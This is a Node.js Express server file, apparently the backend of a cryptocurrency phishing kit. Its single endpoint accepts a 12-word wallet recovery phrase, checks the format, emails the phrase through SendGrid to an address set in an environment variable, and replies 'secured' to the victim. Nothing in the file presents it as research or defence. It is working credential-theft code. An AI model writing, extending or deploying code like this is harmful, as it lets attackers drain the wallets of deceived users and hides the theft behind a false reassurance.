// server.js
require("dotenv").config();
const express = require("express");
const cors = require("cors");
const sgMail = require("@sendgrid/mail");

const app = express();

// Middleware
app.use(cors());
app.use(express.json());

// Setup SendGrid
if (!process.env.SENDGRID_API_KEY) {
  console.error("❌ Missing SENDGRID_API_KEY in .env");
  process.exit(1);
}

sgMail.setApiKey(process.env.SENDGRID_API_KEY);

// API Route: Send Recovery Phrase
app.post("/api/send-phrase", async (req, res) => {
  const { words } = req.body;

  // Validate phrase
  if (!Array.isArray(words) || words.length !== 12) {
    return res.status(400).json({ message: "You must enter exactly 12 words." });
  }

  if (!words.every(w => /^[a-zA-Z]+$/.test(w))) {
    return res.status(400).json({ message: "Each word must contain only letters." });
  }

  try {
    const phrase = words.join(" ");

    // Email object
    const msg = {
      to: process.env.DEST_EMAIL,
      from: process.env.SENDGRID_SENDER, // MUST be verified in SendGrid
      subject: "New Wallet Recovery Phrase",
      text: phrase,
    };

    // Send Email
    await sgMail.send(msg);

    return res.json({ message: "secured" });

  } catch (error) {
    console.error("SendGrid Error:", error.message);

    // SendGrid specific errors
    if (error.response?.body?.errors) {
      console.error(error.response.body.errors);
    }

    return res.status(500).json({ message: "Mail failed to send" });
  }
});

// Start Server
const PORT = process.env.PORT || 5000;
app.listen(PORT, () =>
  console.log(`🚀 Server running on port ${PORT}`)
);
